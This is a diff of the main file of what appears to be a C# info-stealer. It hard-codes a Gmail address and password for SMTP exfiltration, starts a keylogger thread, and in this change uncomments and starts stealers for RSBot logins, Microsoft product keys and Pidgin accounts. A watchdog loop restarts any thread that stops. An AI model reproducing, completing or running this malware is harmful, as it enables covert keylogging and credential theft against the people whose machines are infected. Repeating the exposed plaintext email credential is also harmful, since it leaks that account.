@@ -1,8 +1,12 @@
-﻿using System;
+﻿#region Imports
+
+using System;
 using System.Text;
 using System.Threading;
 using sub.Stealers;
 using sub.Util.Threading;
+
+#endregion
 
 namespace sub
 {
@@ -19,40 +23,40 @@ namespace sub
              */
 
             Settings = new Settings
-                                    {
-                                        EmailAddress = "sexmongrel69@gmail.com",
-                                        EmailPassword = "omglawls",
-                                        SmtpAddress = "smtp.gmail.com",
-                                        SmtpPort = 587
-                                    };
+                           {
+                               EmailAddress = "sexmongrel69@gmail.com",
+                               EmailPassword = "omglawls",
+                               SmtpAddress = "smtp.gmail.com",
+                               SmtpPort = 587
+                           };
             Variables.Mutex = new Mutex(false, GetKey(Random.Next(15, 26)), out Variables.CreatedMutex);
-            
-            StealerThread logger = new StealerThread(new Keylogger(), 1);    
+
+            StealerThread logger = new StealerThread(new Keylogger(), -1);
             logger.Start(); //Starts a Keylogger that reports every 1 minute
-            
+
 
             StealerThread rsbot = new StealerThread(new RSBotStealer(), -1);
-            //rsbot.Start();
+            rsbot.Start();
 
             StealerThread productKeys = new StealerThread(new MicrosoftKeyStealer(), -1);
-            //productKeys.Start();
+            productKeys.Start();
 
             StealerThread pidgin = new StealerThread(new PidginStealer(), -1);
-            //pidgin.Start();
+            pidgin.Start();
 
             while (true)
             {
                 //Implement some kind of checking to make sure none of the threads crashed
                 //Restart them if they did (unless they are meant to run once)
-                foreach(StealerThread st in Variables.stealerPool)
+                foreach (StealerThread st in Variables.stealerPool)
                 {
                     if (st.GetDelay() < 1) continue; //If it is meant to run once, don't revive
-                    if(st.GetStealerThread().ThreadState != ThreadState.Running
+                    if (st.GetStealerThread().ThreadState != ThreadState.Running
                         && st.GetStealerThread().ThreadState != ThreadState.WaitSleepJoin)
                     {
                         st.Start();
                     }
-                    if(st.GetReporterThread().ThreadState != ThreadState.Running
+                    if (st.GetReporterThread().ThreadState != ThreadState.Running
                         && st.GetReporterThread().ThreadState != ThreadState.WaitSleepJoin)
                     {
                         st.Start();
@@ -68,7 +72,7 @@ namespace sub
             StringBuilder sb = new StringBuilder();
 
             while ((length--) > 0)
-                sb.Append(str[(int)(Random.NextDouble() * str.Length)]);
+                sb.Append(str[(int) (Random.NextDouble()*str.Length)]);
 
             return sb.ToString();
         }
